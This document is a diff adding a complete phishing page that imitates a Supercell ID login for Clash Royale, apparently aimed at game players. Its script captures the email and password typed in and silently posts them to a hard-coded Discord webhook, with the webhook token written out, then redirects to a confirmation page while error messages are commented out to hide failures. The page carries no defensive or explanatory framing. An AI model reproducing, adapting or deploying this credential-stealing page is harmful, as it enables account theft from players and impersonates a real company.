@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify your identity</title>
+  <link rel="icon" type="image/x-icon" href="images/icon.ico">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @font-face {
+      font-family: 'MyCustomFont';
+      src: url('fonts/myfont.woff2') format('woff2');
+      font-weight: normal;
+      font-style: normal;
+    }
+    body {
+      font-family: 'MyCustomFont', sans-serif;
+      background: linear-gradient(to bottom right, #4b6cb7, #182848);
+      background-image: url('images/BACKGROUND.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+    .logo {
+      max-width: 250px; /* Increased for Clash Royale logo */
+      height: auto;
+    }
+    .custom-button {
+      width: 100%;
+      max-width: 300px; /* Increased to scale button better */
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    @media (max-width: 640px) {
+      .logo {
+        max-width: 180px; /* Adjusted for mobile */
+      }
+      .custom-button {
+        max-width: 250px; /* Adjusted for mobile */
+      }
+    }
+  </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen">
+  <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+    <div class="flex justify-center mb-6">
+      <img src="images/log.png" alt="Logo" class="logo">
+    </div>
+    <h2 class="text-2xl font-bold mb-6 text-center text-gray-800">Verify your identity:</h2>
+    <form id="loginForm">
+      <div class="mb-4">
+        <label for="email" class="block text-sm font-medium text-gray-700">Supercell ID Email:</label>
+        <input type="email" id="email" class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+      </div>
+      <div class="mb-6">
+        <label for="password" class="block text-sm font-medium text-gray-700">Password:</label>
+        <input type="password" id="password" class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+      </div>
+      <button type="submit" class="hidden">Submit</button>
+      <a href="#" id="customLoginButton" class="block">
+        <img src="images/custom-button.png" alt="Login" class="custom-button" onclick="document.getElementById('loginForm').dispatchEvent(new Event('submit'))">
+      </a>
+    </form>
+    <p id="message" class="mt-4 text-center text-sm text-red-500"></p>
+  </div>
+  <a href="https://supercell.com/en/" target="_blank" class="mt-4 text-white text-sm opacity-80 hover:opacity-100 transition-opacity">
+    ©2025 Supercell Oy
+  </a>
+
+  <script>
+    // Email validation regex
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    // Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1382486034906087595/rHXm0pOTf_jpicrKIECgNc2v0NeQqpeieNw2wQtnwp6jmoKixeGnsAYgd4fFQiMqXXaD';
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const messageElement = document.getElementById('message');
+
+      // Validate email
+      if (!emailRegex.test(email)) {
+        messageElement.textContent = 'Please enter a valid email address.';
+        return;
+      }
+
+      // Prepare data for Discord webhook
+      const data = {
+        content: `**New Login Submission**\nEmail: ${email}\nPassword: ${password}`
+      };
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+
+        if (response.ok) {
+          window.location.href = 'confirmation.html';
+        } else {
+          //messageElement.textContent = 'Failed to send data. Please try again.';
+        }
+      } catch (error) {
+        //messageElement.textContent = 'An error occurred. Please try again.';
+      }
+    });
+  </script>
+</body>
+</html>
